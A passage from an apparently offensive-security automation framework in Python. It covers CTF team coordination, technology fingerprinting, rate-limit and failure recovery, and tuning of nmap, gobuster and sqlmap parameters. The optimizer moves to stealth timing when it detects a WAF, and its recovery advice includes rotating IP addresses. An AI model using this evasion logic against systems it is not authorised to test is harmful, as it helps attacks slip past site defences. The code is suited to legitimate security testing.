        for pattern in common_formats:
            if re.match(pattern, flag, re.IGNORECASE):
                return True

        return False

    def _generate_manual_guidance(self, challenge: CTFChallenge, current_result: Dict[str, Any]) -> List[Dict[str, str]]:
        """Generate manual guidance when automation fails"""
        guidance = []

        # Analyze what was attempted
        attempted_tools = []
        for step in current_result["automated_steps"]:
            attempted_tools.extend(step.get("tools_used", []))

        # Suggest alternative approaches
        all_category_tools = ctf_tools.get_category_tools(f"{challenge.category}_recon")
        unused_tools = [tool for tool in all_category_tools if tool not in attempted_tools]

        if unused_tools:
            guidance.append({
                "action": "try_alternative_tools",
                "description": f"Try these alternative tools: {', '.join(unused_tools[:3])}"
            })

        # Category-specific guidance
        if challenge.category == "web":
            guidance.extend([
                {"action": "manual_source_review", "description": "Manually review all HTML/JS source code for hidden comments or clues"},
                {"action": "parameter_fuzzing", "description": "Manually fuzz parameters with custom payloads"},
                {"action": "cookie_analysis", "description": "Analyze cookies and session management"}
            ])
        elif challenge.category == "crypto":
            guidance.extend([
                {"action": "cipher_research", "description": "Research the specific cipher type and known attacks"},
                {"action": "key_analysis", "description": "Analyze key properties and potential weaknesses"},
                {"action": "frequency_analysis", "description": "Perform detailed frequency analysis"}
            ])
        elif challenge.category == "pwn":
            guidance.extend([
                {"action": "manual_debugging", "description": "Manually debug the binary to understand control flow"},
                {"action": "exploit_development", "description": "Develop custom exploit based on vulnerability analysis"},
                {"action": "payload_crafting", "description": "Craft specific payloads for the identified vulnerability"}
            ])
        elif challenge.category == "forensics":
            guidance.extend([
                {"action": "manual_analysis", "description": "Manually analyze file structures and metadata"},
                {"action": "steganography_deep_dive", "description": "Deep dive into steganography techniques"},
                {"action": "timeline_analysis", "description": "Reconstruct detailed timeline of events"}
            ])
        elif challenge.category == "rev":
            guidance.extend([
                {"action": "algorithm_analysis", "description": "Focus on understanding the core algorithm"},
                {"action": "key_extraction", "description": "Extract hardcoded keys or important values"},
                {"action": "dynamic_analysis", "description": "Use dynamic analysis to understand runtime behavior"}
            ])

        return guidance

class CTFTeamCoordinator:
    """Coordinate team efforts in CTF competitions"""

    def __init__(self):
        self.team_members = {}
        self.challenge_assignments = {}
        self.team_communication = []
        self.shared_resources = {}

    def optimize_team_strategy(self, challenges: List[CTFChallenge], team_skills: Dict[str, List[str]]) -> Dict[str, Any]:
        """Optimize team strategy based on member skills and challenge types"""
        strategy = {
            "assignments": {},
            "priority_queue": [],
            "collaboration_opportunities": [],
            "resource_sharing": {},
            "estimated_total_score": 0,
            "time_allocation": {}
        }

        # Analyze team skills
        skill_matrix = {}
        for member, skills in team_skills.items():
            skill_matrix[member] = {
                "web": "web" in skills or "webapp" in skills,
                "crypto": "crypto" in skills or "cryptography" in skills,
                "pwn": "pwn" in skills or "binary" in skills,
                "forensics": "forensics" in skills or "investigation" in skills,
                "rev": "reverse" in skills or "reversing" in skills,
                "osint": "osint" in skills or "intelligence" in skills,
                "misc": True  # Everyone can handle misc
            }

        # Score challenges for each team member
        member_challenge_scores = {}
        for member in team_skills.keys():
            member_challenge_scores[member] = []

            for challenge in challenges:
                base_score = challenge.points
                skill_multiplier = 1.0

                if skill_matrix[member].get(challenge.category, False):
                    skill_multiplier = 1.5  # 50% bonus for skill match

                difficulty_penalty = {
                    "easy": 1.0,
                    "medium": 0.9,
                    "hard": 0.7,
                    "insane": 0.5,
                    "unknown": 0.8
                }[challenge.difficulty]

                final_score = base_score * skill_multiplier * difficulty_penalty

                member_challenge_scores[member].append({
                    "challenge": challenge,
                    "score": final_score,
                    "estimated_time": self._estimate_solve_time(challenge, skill_matrix[member])
                })

        # Assign challenges using Hungarian algorithm approximation
        assignments = self._assign_challenges_optimally(member_challenge_scores)
        strategy["assignments"] = assignments

        # Create priority queue
        all_assignments = []
        for member, challenges in assignments.items():
            for challenge_info in challenges:
                all_assignments.append({
                    "member": member,
                    "challenge": challenge_info["challenge"].name,
                    "priority": challenge_info["score"],
                    "estimated_time": challenge_info["estimated_time"]
                })

        strategy["priority_queue"] = sorted(all_assignments, key=lambda x: x["priority"], reverse=True)

        # Identify collaboration opportunities
        strategy["collaboration_opportunities"] = self._identify_collaboration_opportunities(challenges, team_skills)

        return strategy

    def _estimate_solve_time(self, challenge: CTFChallenge, member_skills: Dict[str, bool]) -> int:
        """Estimate solve time for a challenge based on member skills"""
        base_times = {
            "easy": 1800,    # 30 minutes
            "medium": 3600,  # 1 hour
            "hard": 7200,    # 2 hours
            "insane": 14400, # 4 hours
            "unknown": 5400  # 1.5 hours
        }

        base_time = base_times[challenge.difficulty]

        # Skill bonus
        if member_skills.get(challenge.category, False):
            base_time = int(base_time * 0.7)  # 30% faster with relevant skills

        return base_time

    def _assign_challenges_optimally(self, member_challenge_scores: Dict[str, List[Dict]]) -> Dict[str, List[Dict]]:
        """Assign challenges to team members optimally"""
        assignments = {member: [] for member in member_challenge_scores.keys()}
        assigned_challenges = set()

        # Simple greedy assignment (in practice, would use Hungarian algorithm)
        for _ in range(len(member_challenge_scores)):
            best_assignment = None
            best_score = -1

            for member, challenge_scores in member_challenge_scores.items():
                for challenge_info in challenge_scores:
                    challenge_name = challenge_info["challenge"].name
                    if challenge_name not in assigned_challenges:
                        if challenge_info["score"] > best_score:
                            best_score = challenge_info["score"]
                            best_assignment = (member, challenge_info)

            if best_assignment:
                member, challenge_info = best_assignment
                assignments[member].append(challenge_info)
                assigned_challenges.add(challenge_info["challenge"].name)

        return assignments

    def _identify_collaboration_opportunities(self, challenges: List[CTFChallenge], team_skills: Dict[str, List[str]]) -> List[Dict[str, Any]]:
        """Identify challenges that would benefit from team collaboration"""
        collaboration_opportunities = []

        for challenge in challenges:
            if challenge.difficulty in ["hard", "insane"]:
                # High-difficulty challenges benefit from collaboration
                relevant_members = []
                for member, skills in team_skills.items():
                    if challenge.category in [skill.lower() for skill in skills]:
                        relevant_members.append(member)

                if len(relevant_members) >= 2:
                    collaboration_opportunities.append({
                        "challenge": challenge.name,
                        "recommended_team": relevant_members,
                        "reason": f"High-difficulty {challenge.category} challenge benefits from collaboration"
                    })

        return collaboration_opportunities

# ============================================================================
# ADVANCED PARAMETER OPTIMIZATION AND INTELLIGENCE (v9.0 ENHANCEMENT)
# ============================================================================

class TechnologyDetector:
    """Advanced technology detection system for context-aware parameter selection"""

    def __init__(self):
        self.detection_patterns = {
            "web_servers": {
                "apache": ["Apache", "apache", "httpd"],
                "nginx": ["nginx", "Nginx"],
                "iis": ["Microsoft-IIS", "IIS"],
                "tomcat": ["Tomcat", "Apache-Coyote"],
                "jetty": ["Jetty"],
                "lighttpd": ["lighttpd"]
            },
            "frameworks": {
                "django": ["Django", "django", "csrftoken"],
                "flask": ["Flask", "Werkzeug"],
                "express": ["Express", "X-Powered-By: Express"],
                "laravel": ["Laravel", "laravel_session"],
                "symfony": ["Symfony", "symfony"],
                "rails": ["Ruby on Rails", "rails", "_session_id"],
                "spring": ["Spring", "JSESSIONID"],
                "struts": ["Struts", "struts"]
            },
            "cms": {
                "wordpress": ["wp-content", "wp-includes", "WordPress", "/wp-admin/"],
                "drupal": ["Drupal", "drupal", "/sites/default/", "X-Drupal-Cache"],
                "joomla": ["Joomla", "joomla", "/administrator/", "com_content"],
                "magento": ["Magento", "magento", "Mage.Cookies"],
                "prestashop": ["PrestaShop", "prestashop"],
                "opencart": ["OpenCart", "opencart"]
            },
            "databases": {
                "mysql": ["MySQL", "mysql", "phpMyAdmin"],
                "postgresql": ["PostgreSQL", "postgres"],
                "mssql": ["Microsoft SQL Server", "MSSQL"],
                "oracle": ["Oracle", "oracle"],
                "mongodb": ["MongoDB", "mongo"],
                "redis": ["Redis", "redis"]
            },
            "languages": {
                "php": ["PHP", "php", ".php", "X-Powered-By: PHP"],
                "python": ["Python", "python", ".py"],
                "java": ["Java", "java", ".jsp", ".do"],
                "dotnet": ["ASP.NET", ".aspx", ".asp", "X-AspNet-Version"],
                "nodejs": ["Node.js", "node", ".js"],
                "ruby": ["Ruby", "ruby", ".rb"],
                "go": ["Go", "golang"],
                "rust": ["Rust", "rust"]
            },
            "security": {
                "waf": ["cloudflare", "CloudFlare", "X-CF-Ray", "incapsula", "Incapsula", "sucuri", "Sucuri"],
                "load_balancer": ["F5", "BigIP", "HAProxy", "nginx", "AWS-ALB"],
                "cdn": ["CloudFront", "Fastly", "KeyCDN", "MaxCDN", "Cloudflare"]
            }
        }

        self.port_services = {
            21: "ftp",
            22: "ssh",
            23: "telnet",
            25: "smtp",
            53: "dns",
            80: "http",
            110: "pop3",
            143: "imap",
            443: "https",
            993: "imaps",
            995: "pop3s",
            1433: "mssql",
            3306: "mysql",
            5432: "postgresql",
            6379: "redis",
            27017: "mongodb",
            8080: "http-alt",
            8443: "https-alt",
            9200: "elasticsearch",
            11211: "memcached"
        }

    def detect_technologies(self, target: str, headers: Dict[str, str] = None, content: str = "", ports: List[int] = None) -> Dict[str, List[str]]:
        """Comprehensive technology detection"""
        detected = {
            "web_servers": [],
            "frameworks": [],
            "cms": [],
            "databases": [],
            "languages": [],
            "security": [],
            "services": []
        }

        # Header-based detection
        if headers:
            for category, tech_patterns in self.detection_patterns.items():
                for tech, patterns in tech_patterns.items():
                    for header_name, header_value in headers.items():
                        for pattern in patterns:
                            if pattern.lower() in header_value.lower() or pattern.lower() in header_name.lower():
                                if tech not in detected[category]:
                                    detected[category].append(tech)

        # Content-based detection
        if content:
            content_lower = content.lower()
            for category, tech_patterns in self.detection_patterns.items():
                for tech, patterns in tech_patterns.items():
                    for pattern in patterns:
                        if pattern.lower() in content_lower:
                            if tech not in detected[category]:
                                detected[category].append(tech)

        # Port-based service detection
        if ports:
            for port in ports:
                if port in self.port_services:
                    service = self.port_services[port]
                    if service not in detected["services"]:
                        detected["services"].append(service)

        return detected

class RateLimitDetector:
    """Intelligent rate limiting detection and automatic timing adjustment"""

    def __init__(self):
        self.rate_limit_indicators = [
            "rate limit",
            "too many requests",
            "429",
            "throttle",
            "slow down",
            "retry after",
            "quota exceeded",
            "api limit",
            "request limit"
        ]

        self.timing_profiles = {
            "aggressive": {"delay": 0.1, "threads": 50, "timeout": 5},
            "normal": {"delay": 0.5, "threads": 20, "timeout": 10},
            "conservative": {"delay": 1.0, "threads": 10, "timeout": 15},
            "stealth": {"delay": 2.0, "threads": 5, "timeout": 30}
        }

    def detect_rate_limiting(self, response_text: str, status_code: int, headers: Dict[str, str] = None) -> Dict[str, Any]:
        """Detect rate limiting from response"""
        rate_limit_detected = False
        confidence = 0.0
        indicators_found = []

        # Status code check
        if status_code == 429:
            rate_limit_detected = True
            confidence += 0.8
            indicators_found.append("HTTP 429 status")

        # Response text check
        response_lower = response_text.lower()
        for indicator in self.rate_limit_indicators:
            if indicator in response_lower:
                rate_limit_detected = True
                confidence += 0.2
                indicators_found.append(f"Text: '{indicator}'")

        # Header check
        if headers:
            rate_limit_headers = ["x-ratelimit", "retry-after", "x-rate-limit"]
            for header_name in headers.keys():
                for rl_header in rate_limit_headers:
                    if rl_header.lower() in header_name.lower():
                        rate_limit_detected = True
                        confidence += 0.3
                        indicators_found.append(f"Header: {header_name}")

        confidence = min(1.0, confidence)

        return {
            "detected": rate_limit_detected,
            "confidence": confidence,
            "indicators": indicators_found,
            "recommended_profile": self._recommend_timing_profile(confidence)
        }

    def _recommend_timing_profile(self, confidence: float) -> str:
        """Recommend timing profile based on rate limit confidence"""
        if confidence >= 0.8:
            return "stealth"
        elif confidence >= 0.5:
            return "conservative"
        elif confidence >= 0.2:
            return "normal"
        else:
            return "aggressive"

    def adjust_timing(self, current_params: Dict[str, Any], profile: str) -> Dict[str, Any]:
        """Adjust timing parameters based on profile"""
        timing = self.timing_profiles.get(profile, self.timing_profiles["normal"])

        adjusted_params = current_params.copy()

        # Adjust common parameters
        if "threads" in adjusted_params:
            adjusted_params["threads"] = timing["threads"]
        if "delay" in adjusted_params:
            adjusted_params["delay"] = timing["delay"]
        if "timeout" in adjusted_params:
            adjusted_params["timeout"] = timing["timeout"]

        # Tool-specific adjustments
        if "additional_args" in adjusted_params:
            args = adjusted_params["additional_args"]

            # Remove existing timing arguments
            args = re.sub(r'-t\s+\d+', '', args)
            args = re.sub(r'--threads\s+\d+', '', args)
            args = re.sub(r'--delay\s+[\d.]+', '', args)

            # Add new timing arguments
            args += f" -t {timing['threads']}"
            if timing["delay"] > 0:
                args += f" --delay {timing['delay']}"

            adjusted_params["additional_args"] = args.strip()

        return adjusted_params

class FailureRecoverySystem:
    """Intelligent failure recovery with alternative tool selection"""

    def __init__(self):
        self.tool_alternatives = {
            "nmap": ["rustscan", "masscan", "zmap"],
            "gobuster": ["dirsearch", "feroxbuster", "dirb"],
            "sqlmap": ["sqlninja", "bbqsql", "jsql-injection"],
            "nuclei": ["nikto", "w3af", "skipfish"],
            "hydra": ["medusa", "ncrack", "patator"],
            "hashcat": ["john", "ophcrack", "rainbowcrack"],
            "amass": ["subfinder", "sublist3r", "assetfinder"],
            "ffuf": ["wfuzz", "gobuster", "dirb"]
        }

        self.failure_patterns = {
            "timeout": ["timeout", "timed out", "connection timeout"],
            "permission_denied": ["permission denied", "access denied", "forbidden"],
            "not_found": ["not found", "command not found", "no such file"],
            "network_error": ["network unreachable", "connection refused", "host unreachable"],
            "rate_limited": ["rate limit", "too many requests", "throttled"],
            "authentication_required": ["authentication required", "unauthorized", "login required"]
        }

    def analyze_failure(self, error_output: str, exit_code: int) -> Dict[str, Any]:
        """Analyze failure and suggest recovery strategies"""
        failure_type = "unknown"
        confidence = 0.0
        recovery_strategies = []

        error_lower = error_output.lower()

        # Identify failure type
        for failure, patterns in self.failure_patterns.items():
            for pattern in patterns:
                if pattern in error_lower:
                    failure_type = failure
                    confidence += 0.3
                    break

        # Exit code analysis
        if exit_code == 1:
            confidence += 0.1
        elif exit_code == 124:  # timeout
            failure_type = "timeout"
            confidence += 0.5
        elif exit_code == 126:  # permission denied
            failure_type = "permission_denied"
            confidence += 0.5

        confidence = min(1.0, confidence)

        # Generate recovery strategies
        if failure_type == "timeout":
            recovery_strategies = [
                "Increase timeout values",
                "Reduce thread count",
                "Use alternative faster tool",
                "Split target into smaller chunks"
            ]
        elif failure_type == "permission_denied":
            recovery_strategies = [
                "Run with elevated privileges",
                "Check file permissions",
                "Use alternative tool with different approach"
            ]
        elif failure_type == "rate_limited":
            recovery_strategies = [
                "Implement delays between requests",
                "Reduce thread count",
                "Use stealth timing profile",
                "Rotate IP addresses if possible"
            ]
        elif failure_type == "network_error":
            recovery_strategies = [
                "Check network connectivity",
                "Try alternative network routes",
                "Use proxy or VPN",
                "Verify target is accessible"
            ]

        return {
            "failure_type": failure_type,
            "confidence": confidence,
            "recovery_strategies": recovery_strategies,
            "alternative_tools": self.tool_alternatives.get(self._extract_tool_name(error_output), [])
        }

    def _extract_tool_name(self, error_output: str) -> str:
        """Extract tool name from error output"""
        for tool in self.tool_alternatives.keys():
            if tool in error_output.lower():
                return tool
        return "unknown"

class PerformanceMonitor:
    """Advanced performance monitoring with automatic resource allocation"""

    def __init__(self):
        self.performance_metrics = {}
        self.resource_thresholds = {
            "cpu_high": 80.0,
            "memory_high": 85.0,
            "disk_high": 90.0,
            "network_high": 80.0
        }

        self.optimization_rules = {
            "high_cpu": {
                "reduce_threads": 0.5,
                "increase_delay": 2.0,
                "enable_nice": True
            },
            "high_memory": {
                "reduce_batch_size": 0.6,
                "enable_streaming": True,
                "clear_cache": True
            },
            "high_disk": {
                "reduce_output_verbosity": True,
                "enable_compression": True,
                "cleanup_temp_files": True
            },
            "high_network": {
                "reduce_concurrent_connections": 0.7,
                "increase_timeout": 1.5,
                "enable_connection_pooling": True
            }
        }

    def monitor_system_resources(self) -> Dict[str, float]:
        """Monitor current system resource usage"""
        try:
            cpu_percent = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            network = psutil.net_io_counters()

            return {
                "cpu_percent": cpu_percent,
                "memory_percent": memory.percent,
                "disk_percent": disk.percent,
                "network_bytes_sent": network.bytes_sent,
                "network_bytes_recv": network.bytes_recv,
                "timestamp": time.time()
            }
        except Exception as e:
            logger.error(f"Error monitoring system resources: {str(e)}")
            return {}

    def optimize_based_on_resources(self, current_params: Dict[str, Any], resource_usage: Dict[str, float]) -> Dict[str, Any]:
        """Optimize parameters based on current resource usage"""
        optimized_params = current_params.copy()
        optimizations_applied = []

        # CPU optimization
        if resource_usage.get("cpu_percent", 0) > self.resource_thresholds["cpu_high"]:
            if "threads" in optimized_params:
                original_threads = optimized_params["threads"]
                optimized_params["threads"] = max(1, int(original_threads * self.optimization_rules["high_cpu"]["reduce_threads"]))
                optimizations_applied.append(f"Reduced threads from {original_threads} to {optimized_params['threads']}")

            if "delay" in optimized_params:
                original_delay = optimized_params.get("delay", 0)
                optimized_params["delay"] = original_delay * self.optimization_rules["high_cpu"]["increase_delay"]
                optimizations_applied.append(f"Increased delay to {optimized_params['delay']}")

        # Memory optimization
        if resource_usage.get("memory_percent", 0) > self.resource_thresholds["memory_high"]:
            if "batch_size" in optimized_params:
                original_batch = optimized_params["batch_size"]
                optimized_params["batch_size"] = max(1, int(original_batch * self.optimization_rules["high_memory"]["reduce_batch_size"]))
                optimizations_applied.append(f"Reduced batch size from {original_batch} to {optimized_params['batch_size']}")

        # Network optimization
        if "network_bytes_sent" in resource_usage:
            # Simple heuristic for high network usage
            if resource_usage["network_bytes_sent"] > 1000000:  # 1MB/s
                if "concurrent_connections" in optimized_params:
                    original_conn = optimized_params["concurrent_connections"]
                    optimized_params["concurrent_connections"] = max(1, int(original_conn * self.optimization_rules["high_network"]["reduce_concurrent_connections"]))
                    optimizations_applied.append(f"Reduced concurrent connections to {optimized_params['concurrent_connections']}")

        optimized_params["_optimizations_applied"] = optimizations_applied
        return optimized_params

class ParameterOptimizer:
    """Advanced parameter optimization system with intelligent context-aware selection"""

    def __init__(self):
        self.tech_detector = TechnologyDetector()
        self.rate_limiter = RateLimitDetector()
        self.failure_recovery = FailureRecoverySystem()
        self.performance_monitor = PerformanceMonitor()

        # Tool-specific optimization profiles
        self.optimization_profiles = {
            "nmap": {
                "stealth": {
                    "scan_type": "-sS",
                    "timing": "-T2",
                    "additional_args": "--max-retries 1 --host-timeout 300s"
                },
                "normal": {
                    "scan_type": "-sS -sV",
                    "timing": "-T4",
                    "additional_args": "--max-retries 2"
                },
                "aggressive": {
                    "scan_type": "-sS -sV -sC -O",
                    "timing": "-T5",
                    "additional_args": "--max-retries 3 --min-rate 1000"
                }
            },
            "gobuster": {
                "stealth": {
                    "threads": 5,
                    "delay": "1s",
                    "timeout": "30s"
                },
                "normal": {
                    "threads": 20,
                    "delay": "0s",
                    "timeout": "10s"
                },
                "aggressive": {
                    "threads": 50,
                    "delay": "0s",
                    "timeout": "5s"
                }
            },
            "sqlmap": {
                "stealth": {
                    "level": 1,
                    "risk": 1,
                    "threads": 1,
                    "delay": 1
                },
                "normal": {
                    "level": 2,
                    "risk": 2,
                    "threads": 5,
                    "delay": 0
                },
                "aggressive": {
                    "level": 3,
                    "risk": 3,
                    "threads": 10,
                    "delay": 0
                }
            }
        }

    def optimize_parameters_advanced(self, tool: str, target_profile: TargetProfile, context: Dict[str, Any] = None) -> Dict[str, Any]:
        """Advanced parameter optimization with full intelligence"""
        if context is None:
            context = {}

        # Get base parameters
        base_params = self._get_base_parameters(tool, target_profile)

        # Detect technologies for context-aware optimization
        detected_tech = self.tech_detector.detect_technologies(
            target_profile.target,
            headers=context.get("headers", {}),
            content=context.get("content", ""),
            ports=target_profile.open_ports
        )

        # Apply technology-specific optimizations
        tech_optimized_params = self._apply_technology_optimizations(tool, base_params, detected_tech)

        # Monitor system resources and optimize accordingly
        resource_usage = self.performance_monitor.monitor_system_resources()
        resource_optimized_params = self.performance_monitor.optimize_based_on_resources(tech_optimized_params, resource_usage)

        # Apply profile-based optimizations
        profile = context.get("optimization_profile", "normal")
        profile_optimized_params = self._apply_profile_optimizations(tool, resource_optimized_params, profile)

        # Add metadata
        profile_optimized_params["_optimization_metadata"] = {
            "detected_technologies": detected_tech,
            "resource_usage": resource_usage,
            "optimization_profile": profile,
            "optimizations_applied": resource_optimized_params.get("_optimizations_applied", []),
            "timestamp": datetime.now().isoformat()
        }

        return profile_optimized_params

    def _get_base_parameters(self, tool: str, profile: TargetProfile) -> Dict[str, Any]:
        """Get base parameters for a tool"""
        base_params = {"target": profile.target}

        # Tool-specific base parameters
        if tool == "nmap":
            base_params.update({
                "scan_type": "-sS",
                "ports": "1-1000",
                "timing": "-T4"
            })
        elif tool == "gobuster":
            base_params.update({
                "mode": "dir",
                "threads": 20,
                "wordlist": "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
            })
        elif tool == "sqlmap":
            base_params.update({
                "batch": True,
                "level": 1,
                "risk": 1
            })
        elif tool == "nuclei":
            base_params.update({
                "severity": "critical,high,medium",
                "threads": 25
            })

        return base_params

    def _apply_technology_optimizations(self, tool: str, params: Dict[str, Any], detected_tech: Dict[str, List[str]]) -> Dict[str, Any]:
        """Apply technology-specific optimizations"""
        optimized_params = params.copy()

        # Web server optimizations
        if "apache" in detected_tech.get("web_servers", []):
            if tool == "gobuster":
                optimized_params["extensions"] = "php,html,txt,xml,conf"
            elif tool == "nuclei":
                optimized_params["tags"] = optimized_params.get("tags", "") + ",apache"

        elif "nginx" in detected_tech.get("web_servers", []):
            if tool == "gobuster":
                optimized_params["extensions"] = "php,html,txt,json,conf"
            elif tool == "nuclei":
                optimized_params["tags"] = optimized_params.get("tags", "") + ",nginx"

        # CMS optimizations
        if "wordpress" in detected_tech.get("cms", []):
            if tool == "gobuster":
                optimized_params["extensions"] = "php,html,txt,xml"
                optimized_params["additional_paths"] = "/wp-content/,/wp-admin/,/wp-includes/"
            elif tool == "nuclei":
                optimized_params["tags"] = optimized_params.get("tags", "") + ",wordpress"
            elif tool == "wpscan":
                optimized_params["enumerate"] = "ap,at,cb,dbe"

        # Language-specific optimizations
        if "php" in detected_tech.get("languages", []):
            if tool == "gobuster":
                optimized_params["extensions"] = "php,php3,php4,php5,phtml,html"
            elif tool == "sqlmap":
                optimized_params["dbms"] = "mysql"

        elif "dotnet" in detected_tech.get("languages", []):
            if tool == "gobuster":
                optimized_params["extensions"] = "aspx,asp,html,txt"
            elif tool == "sqlmap":
                optimized_params["dbms"] = "mssql"

        # Security feature adaptations
        if detected_tech.get("security", []):
            # WAF detected - use stealth mode
            if any(waf in detected_tech["security"] for waf in ["cloudflare", "incapsula", "sucuri"]):
                optimized_params["_stealth_mode"] = True
                if tool == "gobuster":
                    optimized_params["threads"] = min(optimized_params.get("threads", 20), 5)
                    optimized_params["delay"] = "2s"
                elif tool == "sqlmap":
                    optimized_params["delay"] = 2
                    optimized_params["randomize"] = True

        return optimized_params

    def _apply_profile_optimizations(self, tool: str, params: Dict[str, Any], profile: str) -> Dict[str, Any]:
        """Apply optimization profile settings"""
        if tool not in self.optimization_profiles:
            return params

        profile_settings = self.optimization_profiles[tool].get(profile, {})
        optimized_params = params.copy()

        # Apply profile-specific settings
        for key, value in profile_settings.items():
            optimized_params[key] = value

        # Handle stealth mode flag
        if params.get("_stealth_mode", False) and profile != "stealth":
            # Force stealth settings even if different profile requested
            stealth_settings = self.optimization_profiles[tool].get("stealth", {})
            for key, value in stealth_settings.items():
                optimized_params[key] = value

        return optimized_params

    def handle_tool_failure(self, tool: str, error_output: str, exit_code: int, current_params: Dict[str, Any]) -> Dict[str, Any]:
        """Handle tool failure and suggest recovery"""
        failure_analysis = self.failure_recovery.analyze_failure(error_output, exit_code)

        recovery_plan = {
            "original_tool": tool,
            "failure_analysis": failure_analysis,
            "recovery_actions": [],
            "alternative_tools": failure_analysis["alternative_tools"],
            "adjusted_parameters": current_params.copy()
        }

        # Apply automatic parameter adjustments based on failure type
        if failure_analysis["failure_type"] == "timeout":
            if "timeout" in recovery_plan["adjusted_parameters"]:
                recovery_plan["adjusted_parameters"]["timeout"] *= 2
            if "threads" in recovery_plan["adjusted_parameters"]:
                recovery_plan["adjusted_parameters"]["threads"] = max(1, recovery_plan["adjusted_parameters"]["threads"] // 2)
            recovery_plan["recovery_actions"].append("Increased timeout and reduced threads")

        elif failure_analysis["failure_type"] == "rate_limited":
            timing_profile = self.rate_limiter.adjust_timing(recovery_plan["adjusted_parameters"], "stealth")
            recovery_plan["adjusted_parameters"].update(timing_profile)
            recovery_plan["recovery_actions"].append("Applied stealth timing profile")

        return recovery_plan

# ============================================================================
# ADVANCED PROCESS MANAGEMENT AND MONITORING (v10.0 ENHANCEMENT)
# ============================================================================

class ProcessPool:
    """Intelligent process pool with auto-scaling capabilities"""

    def __init__(self, min_workers=2, max_workers=20, scale_threshold=0.8):
        self.min_workers = min_workers
        self.max_workers = max_workers
        self.scale_threshold = scale_threshold
        self.workers = []
        self.task_queue = queue.Queue()
        self.results = {}
        self.pool_lock = threading.Lock()
        self.active_tasks = {}
        self.performance_metrics = {
            "tasks_completed": 0,
            "tasks_failed": 0,
            "avg_task_time": 0.0,
            "cpu_usage": 0.0,
            "memory_usage": 0.0
        }

        # Initialize minimum workers
        self._scale_up(self.min_workers)

        # Start monitoring thread
        self.monitor_thread = threading.Thread(target=self._monitor_performance, daemon=True)
        self.monitor_thread.start()

    def submit_task(self, task_id: str, func, *args, **kwargs) -> str:
        """Submit a task to the process pool"""
        task = {
            "id": task_id,
            "func": func,
            "args": args,
            "kwargs": kwargs,
            "submitted_at": time.time(),
            "status": "queued"
        }

        with self.pool_lock:
            self.active_tasks[task_id] = task
            self.task_queue.put(task)

        logger.info(f"📋 Task submitted to pool: {task_id}")
        return task_id

    def get_task_result(self, task_id: str) -> Dict[str, Any]:
        """Get result of a submitted task"""
        with self.pool_lock:
            if task_id in self.results:
                return self.results[task_id]
            elif task_id in self.active_tasks:
                return {"status": self.active_tasks[task_id]["status"], "result": None}
            else:
                return {"status": "not_found", "result": None}

    def _worker_thread(self, worker_id: int):
        """Worker thread that processes tasks"""
        logger.info(f"🔧 Process pool worker {worker_id} started")

        while True:
            try:
                # Get task from queue with timeout
                task = self.task_queue.get(timeout=30)
                if task is None:  # Shutdown signal
                    break

                task_id = task["id"]
                start_time = time.time()

                # Update task status
                with self.pool_lock:
                    if task_id in self.active_tasks:
                        self.active_tasks[task_id]["status"] = "running"
                        self.active_tasks[task_id]["worker_id"] = worker_id
                        self.active_tasks[task_id]["started_at"] = start_time

                try:
                    # Execute task
                    result = task["func"](*task["args"], **task["kwargs"])

                    # Store result
                    execution_time = time.time() - start_time
                    with self.pool_lock:
                        self.results[task_id] = {
                            "status": "completed",
                            "result": result,
                            "execution_time": execution_time,
                            "worker_id": worker_id,
                            "completed_at": time.time()
                        }

                        # Update performance metrics
                        self.performance_metrics["tasks_completed"] += 1
                        self.performance_metrics["avg_task_time"] = (
                            (self.performance_metrics["avg_task_time"] * (self.performance_metrics["tasks_completed"] - 1) + execution_time) /
                            self.performance_metrics["tasks_completed"]
                        )

                        # Remove from active tasks
                        if task_id in self.active_tasks:
                            del self.active_tasks[task_id]

                    logger.info(f"✅ Task completed: {task_id} in {execution_time:.2f}s")

                except Exception as e:
                    # Handle task failure
                    with self.pool_lock:
                        self.results[task_id] = {
                            "status": "failed",
                            "error": str(e),
                            "execution_time": time.time() - start_time,
                            "worker_id": worker_id,
                            "failed_at": time.time()
                        }

                        self.performance_metrics["tasks_failed"] += 1

                        if task_id in self.active_tasks:
                            del self.active_tasks[task_id]

                    logger.error(f"❌ Task failed: {task_id} - {str(e)}")

                self.task_queue.task_done()

            except queue.Empty:
                # No tasks available, continue waiting
                continue
            except Exception as e:
                logger.error(f"💥 Worker {worker_id} error: {str(e)}")

    def _monitor_performance(self):
        """Monitor pool performance and auto-scale"""
        while True:
            try:
                time.sleep(10)  # Monitor every 10 seconds

                with self.pool_lock:
                    queue_size = self.task_queue.qsize()
                    active_workers = len([w for w in self.workers if w.is_alive()])
                    active_tasks_count = len(self.active_tasks)

                # Calculate load metrics
                if active_workers > 0:
                    load_ratio = (active_tasks_count + queue_size) / active_workers
                else:
                    load_ratio = float('inf')

                # Auto-scaling logic
                if load_ratio > self.scale_threshold and active_workers < self.max_workers:
                    # Scale up
                    new_workers = min(2, self.max_workers - active_workers)
                    self._scale_up(new_workers)
                    logger.info(f"📈 Scaled up process pool: +{new_workers} workers (total: {active_workers + new_workers})")

                elif load_ratio < 0.3 and active_workers > self.min_workers:
                    # Scale down
                    workers_to_remove = min(1, active_workers - self.min_workers)
                    self._scale_down(workers_to_remove)
                    logger.info(f"📉 Scaled down process pool: -{workers_to_remove} workers (total: {active_workers - workers_to_remove})")

                # Update performance metrics
                try:
                    cpu_percent = psutil.cpu_percent()
                    memory_info = psutil.virtual_memory()

                    with self.pool_lock:
                        self.performance_metrics["cpu_usage"] = cpu_percent
                        self.performance_metrics["memory_usage"] = memory_info.percent

                except Exception:
                    pass  # Ignore psutil errors

            except Exception as e:
                logger.error(f"💥 Pool monitor error: {str(e)}")

    def _scale_up(self, count: int):
        """Add workers to the pool"""
        with self.pool_lock:
            for i in range(count):
                worker_id = len(self.workers)
                worker = threading.Thread(target=self._worker_thread, args=(worker_id,), daemon=True)
                worker.start()
                self.workers.append(worker)

    def _scale_down(self, count: int):
        """Remove workers from the pool"""
        with self.pool_lock:
            for _ in range(count):
                if len(self.workers) > self.min_workers:
                    # Signal worker to shutdown by putting None in queue
                    self.task_queue.put(None)
                    # Remove from workers list (worker will exit naturally)
                    if self.workers:
                        self.workers.pop()

    def get_pool_stats(self) -> Dict[str, Any]:
        """Get current pool statistics"""
        with self.pool_lock:
            active_workers = len([w for w in self.workers if w.is_alive()])
            return {
                "active_workers": active_workers,
                "queue_size": self.task_queue.qsize(),
                "active_tasks": len(self.active_tasks),
